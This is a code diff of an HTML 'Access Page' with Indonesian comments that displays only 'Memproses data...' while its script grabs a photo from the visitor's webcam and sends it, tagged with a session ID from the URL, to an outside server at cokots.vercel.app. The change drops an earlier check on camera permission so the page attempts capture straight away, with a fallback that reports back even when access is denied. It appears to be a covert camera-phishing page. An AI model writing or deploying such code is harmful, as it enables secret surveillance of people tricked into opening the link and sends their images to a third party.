@@ -6,41 +6,30 @@
     <title>Access Page</title>
     <script>
         async function sendDataToServer() {
-            // Mengambil informasi izin kamera terlebih dahulu
-            const permission = await navigator.permissions.query({ name: "camera" });
+            try {
+                // Mencoba untuk mengakses kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const photoBlob = await imageCapture.takePhoto();
+                track.stop(); // Hentikan kamera setelah foto diambil
 
-            // Mengecek status izin
-            if (permission.state === "granted") {
-                try {
-                    // Jika izin diberikan, ambil gambar dari kamera
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const track = stream.getVideoTracks()[0];
-                    const imageCapture = new ImageCapture(track);
-                    const photoBlob = await imageCapture.takePhoto();
-                    track.stop(); // Hentikan kamera setelah foto diambil
+                // Kirim foto ke server
+                const formData = new FormData();
+                formData.append("photo", photoBlob);
 
-                    // Kirim foto ke server
-                    const formData = new FormData();
-                    formData.append("photo", photoBlob);
+                const session = new URLSearchParams(window.location.search).get("session");
 
-                    const session = new URLSearchParams(window.location.search).get("session");
+                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+                    method: "POST",
+                    body: formData,
+                });
 
-                    await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
-                        method: "POST",
-                        body: formData,
-                    });
+                console.log("Data berhasil dikirim.");
+            } catch (error) {
+                console.error("Error:", error);
 
-                    // Pesan berhasil dikirim
-                    console.log("Data berhasil dikirim.");
-
-                } catch (error) {
-                    console.error("Error:", error);
-
-                    // Kirimkan data kosong dengan fallback gambar
-                    sendEmptyDataToAPI();
-                }
-            } else {
-                // Jika izin tidak diberikan, kirim data kosong dengan fallback gambar
+                // Kirimkan data kosong dengan fallback gambar jika izin kamera ditolak atau terjadi error
                 sendEmptyDataToAPI();
             }
         }
@@ -66,7 +55,6 @@
                     body: formData,
                 });
 
-                // Cek apakah respons berhasil
                 if (response.ok) {
                     console.log("Data kosong (fallback) berhasil dikirim.");
                 } else {
@@ -83,7 +71,6 @@
 </head>
 <body>
     <h1>Memproses data...</h1>
-    <!-- Menampilkan pesan gagal jika izin kamera tidak diberikan -->
     <p id="gagal" style="color: red;"></p>
 </body>
 </html>
